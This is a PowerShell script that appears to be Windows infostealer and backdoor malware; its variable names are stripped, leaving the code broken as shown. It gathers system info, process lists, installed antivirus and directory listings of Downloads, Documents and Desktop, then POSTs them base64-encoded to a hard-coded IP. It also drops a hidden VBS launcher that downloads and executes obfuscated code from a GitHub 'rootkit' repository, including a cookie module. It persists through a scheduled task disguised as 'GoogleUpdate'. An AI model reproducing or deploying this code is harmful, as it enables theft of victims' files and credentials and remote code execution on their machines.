    ='http://38.180.137.24/receive.php' 

    function GetFile() {
        param (
            ,
            
        )
        Write-Output 
        =[IO.File]::readallbytes();
        =[System.Convert]::ToBase64String();
        =[regex]::Replace(,'=','%');
        ='access='++'&name='+;
        Invoke-WebRequest -Uri  -Method Post -Body ;
    }

     = "{0:yyyyMMddHHmmss}" -f (Get-Date)
     = "C:\Users\devil\AppData\Roaming\koala_"

     = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
     = ipconfig /all
    =Get-process
     = systeminfo
     = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct
     =  | Select-Object DisplayName, ProductState, PathToSignedProductExe
    Write-Output 

    ac   -Encoding 'utf8'
    ac  
    ac  
    ac  
    ac  

     = "info.log"

    GetFile  

    del 

     = "C:\Users\devil\AppData\Roaming\down.txt"
     = "C:\Users\devil\AppData\Roaming\docu.txt"
     = "C:\Users\devil\AppData\Roaming\desk.txt"
    dir "C:\Users\devil\Downloads" -depth 10 >> 
    dir "C:\Users\devil\Documents" -depth 10 >> 
    dir "C:\Users\devil\Desktop" -depth 10 >> 
    GetFile  "down.txt"
    GetFile  "docu.txt"
    GetFile  "desk.txt"

    del 
    del 
    del 

    function Set_bootACL()
    {
        attrib +S +H 
    }

     = C:\Users\devil\AppData\Roaming + '\setupact.vbs'
     = @"
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "powershell -WindowStyle Hidden -Command ""$nbvccxxx = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/logger'); $qweewqqq = $nbvccxxx.Replace('afhelfvx', ''); $zxdsxxxxcc = IEX $qweewqqq; Invoke-Expression $zxdsxxxxcc;""", 0, True
    "@
    Set-Content -Path  -Value  -Encoding ASCII

    Set_bootACL()
    wscript.exe 
    schtasks /create /tn "GoogleUpdate" /tr "" /sc daily /st 14:30 /f

    # schtasks /create /tn "koauSche" /tr "" /sc onlogon
    function Z1p-P4ck {
        param (
            [string]
        )
         = .Replace('wxffedd', '')
         = .Replace('amwhatkl', 't')
        =iex ;
        Invoke-Expression 
    }
     = {(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/urls.ps1')};
     = {(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/cokie')};

    Z1p-P4ck -zZZz 
    Z1p-P4ck -zZZz 